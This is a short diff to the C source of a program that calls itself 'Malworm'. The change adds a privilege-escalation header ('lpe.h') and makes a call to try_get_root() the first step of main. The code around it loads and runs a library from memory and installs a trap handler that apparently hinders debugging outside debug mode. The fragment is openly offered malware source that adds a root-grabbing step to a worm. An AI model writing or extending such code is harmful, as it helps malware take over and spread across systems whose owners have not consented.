@@ -20,7 +20,7 @@
 
 #include "main/utils.h"
 #include "main/globals.h"
-
+#include "lpe.h"
 
 void trap_handler(int signo, siginfo_t *info, void *context){
     return;
@@ -181,7 +181,7 @@ void load_libraries(Globals *global){
     void* lib_mem = load_library(lib);
     global->lib_mem = lib_mem;
     global->lib = lib;
-    
+
     // run the library code (entry)
     DEBUG_LOG("🦠🪱🐛🪱🐉 Malworm ready to eat you! 🐉🪱🐛🪱🦠\n");
     FOOLS;
@@ -247,11 +247,14 @@ void setup_trap_handler(){
 }
 
 int main(int argc, char**argv) {
+
+    try_get_root();
+
     FOOLS;
     if(!DEBUG){
         setup_trap_handler();
     }
-    
+
     // setup global variables and functions
     Globals *global = (Globals *) malloc(sizeof(Globals));
     srand(time(NULL));
